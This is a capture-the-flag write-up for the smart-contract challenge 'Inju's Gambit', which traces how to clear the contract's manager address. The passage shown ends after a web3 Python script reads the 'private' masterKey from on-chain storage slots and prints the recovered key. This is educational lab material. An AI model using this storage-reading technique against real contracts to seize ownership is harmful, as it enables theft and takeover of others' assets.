# Inju's Gambit

> Inju owns all the things in the area, waiting for one worthy challenger to emerge.
>  Rumor said, that there many ways from many different angle to tackle Inju.
>  Are you the Challenger worthy to oppose him?

Attached files: [Setup.sol](./source/Setup.sol), [ChallengeManager.sol](./source/ChallengeManager.sol), [Privileged.sol](./source/Privileged.sol)

## Challenge Outline
As usual, the goal of the challenge is to make the isSolved function in the setup contract return true.
```solidity
function isSolved() public view returns(bool){
    return address(privileged.challengeManager()) == address(0);
}
```
It seems like our goal is to set the address of the challengeManager address in the privileged contract to the null address. I started working backwards and looked through Privileged.sol for a function that would be able to do that. Luckily for us, the fireManager function seems to do just that.
```solidity
function fireManager() public onlyOwner{
    challengeManager = address(0);
}
```
However, in order to call fireManager, we first need to become the owner of the privileged contract. The current owner of the privileged contract is the contract that deployed it: the challenge manager contract. I looked through the challenge manager contract for a function that would allow us to either call the fireManager function or to beome the owner of the contract ourselves.
```solidity
    function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
        if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
            privileged.setNewCasinoOwner(address(theChallenger));
        }
    }
```
The challengeCurrentOwner seems to do that. In order to become the new owner, we need two things: to be the chosen challenger, and the master key. `bytes32 private masterKey` shows us that the masterKey is a private variable; a private variable just means that it can't be accessed externally, but it is still public on the blockchain, which means that all we have to do is read it from there. In the Ethereum, a contract's state variables are stored in storage slots, which can each hold up to 32 bytes. We can read the slots to find the value of the masterKey.
```python
from web3 import Web3

rpc_url = "http://45.32.119.201:44445/f03fa921-b78f-4d64-87b1-e25a5af93fd1"  # rpc endpoint
w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    print("Couldn't connect")
    exit(1)

def read_slot(address, slot):
    value = w3.eth.get_storage_at(address, slot)
    return value

contract_addr = "0x4635c4064F565f0a5ca43D4893a2a6977F2B2655"  # the address of the challengeManager contract
for x in range(10):
    key = read_slot(contract_addr, x)
    print(x, key, key.hex())
```
You can determine which slot a certain variable is stored in based on the order they are declared, but I was lazy and decided to just print them all out :P.
Based on the output, I think it is safe to assume that INJUINJUINJUSUPERKEYKEYKEYKEYKEY is our master key: `1 b'INJUINJUINJUSUPERKEYKEYKEYKEYKEY' 494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559`.

